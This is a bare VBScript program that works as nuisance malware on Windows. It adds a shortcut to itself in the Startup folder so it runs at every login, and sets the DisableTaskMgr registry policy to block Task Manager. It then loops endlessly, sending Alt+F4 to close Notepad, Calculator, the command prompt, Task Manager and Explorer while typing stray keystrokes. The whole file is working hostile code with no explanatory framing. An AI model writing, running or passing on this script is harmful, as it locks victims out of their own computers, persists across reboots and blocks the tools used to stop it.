Set WshShell = WScript.CreateObject("WScript.Shell")
strExeNames = Array("notepad.exe", "calc.exe", "cmd.exe", "taskmgr.exe", "explorer.exe")

'Add script to Startup folder
strStartupPath = WshShell.SpecialFolders("Startup")
Set objShellLink = WshShell.CreateShortcut(strStartupPath & "\CloseWindows.vbs.lnk")
objShellLink.TargetPath = WScript.ScriptFullName
objShellLink.Save

'Registry edit to disable Task Manager
strKeyPath = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System"
strValueName = "DisableTaskMgr"
strValueType = "REG_DWORD"
intValue = 1
WshShell.RegWrite strKeyPath & "\" & strValueName, intValue, strValueType

Do
    For Each strExeName In strExeNames
        Set objWmi = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\.\root\cimv2")
        Set colProcessList = objWmi.ExecQuery("Select * from Win32_Process Where Name = '" & strExeName & "'")
        
        If colProcessList.Count > 0 Then
            For Each objProcess In colProcessList
                WshShell.AppActivate objProcess.ProcessId
                WScript.Sleep 500 'wait for window to activate before closing
                WshShell.SendKeys "%{F4}" 'sends Alt+F4 to close window
            Next
        End If
    Next
    
    'Type "n" into search bar with focus
    WshShell.SendKeys "n"
    
    WScript.Sleep 0 'wait before checking again
Loop
